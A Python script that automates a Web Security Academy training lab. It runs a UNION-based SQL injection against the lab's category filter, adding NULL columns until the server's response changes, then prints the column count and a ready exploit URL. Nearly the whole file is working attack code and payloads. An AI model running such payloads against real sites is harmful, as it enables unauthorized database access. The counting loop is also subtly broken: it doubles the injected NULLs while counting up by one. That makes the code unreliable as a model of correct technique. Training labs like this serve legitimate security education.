import requests
import sys
from bs4 import BeautifulSoup

# Solves      : SQL injection UNION attack, determining the number of columns returned by the query
# Description : We know that we have to exploit UNION based injection.
# Hint        : First we inject '+UNION+SELECT+NULL--- 
#               We have keep adding NULL values until we get a response from the server.

print("Problem Statement : Using SQL injection UNION attack, determine the number of columns returned by the query")
print("For Union Attack: First we inject \" \'+UNION+SELECT+NULL--- \" then \n We have keep adding NULL values until we get a response from the server. \n\n")



#Verifying If Correct URL Is Given 
try:
    rootURL = sys.argv[1]
except:
    print("You have not Entered the root URL argument")
    rootURL = input("Enter The Root URL (*.web-security-academy.net):")

while True:
    try:
        while rootURL[-1] == "/":
            rootURL = rootURL[:-1]
        response = requests.get(rootURL)
        if(response.status_code != 200):
            print("Check URL/Connection")
            raise Exception()
        
        bsObj = BeautifulSoup(response.text, "html.parser")
        title = bsObj.head.title
        
        if(title.contents[0] != "SQL injection UNION attack, determining the number of columns returned by the query"):
            print("Incorrect URL: Please Enter root URL of \"SQL injection UNION attack, determining the number of columns returned by the query\" Lab")
            raise Exception()
        
        break
    
    except Exception as inst:
            print(inst)
            rootURL = input("Enter The Root URL (*.web-security-academy.net):")    


#Exploit Explaination + script
print("Explioting.... \n")
response = requests.get(rootURL+"/filter?category=Clothing%2c+shoes+and+accessories%27+UNION--")
invalidResponse = response.text
injectNull = ",NULL"
columnsAvailable = 2
while True:
    url = rootURL+"/filter?category=Clothing%2c+shoes+and+accessories%27+UNION+SELECT+NULL"+injectNull+"--"
    response = requests.get(url)
    if(response.text != invalidResponse):
        break
    columnsAvailable = columnsAvailable + 1
    injectNull = injectNull + injectNull
#Exploit Code Ends


#Results
print("Total Null values inserted in table: "+str(columnsAvailable))
print("Hence, Total no of columns is "+str(columnsAvailable))
print("\n")
print("This link confirms injection exists as this shows \"Internel Server Error\":")
print(rootURL+"/filter?category=Corporate+gifts%27+UNION+SELECT+NULL"+"--")
print("Exploit URL : ",end="")
print(rootURL+"/filter?category=Corporate+gifts%27+UNION+SELECT+NULL"+injectNull+"--")
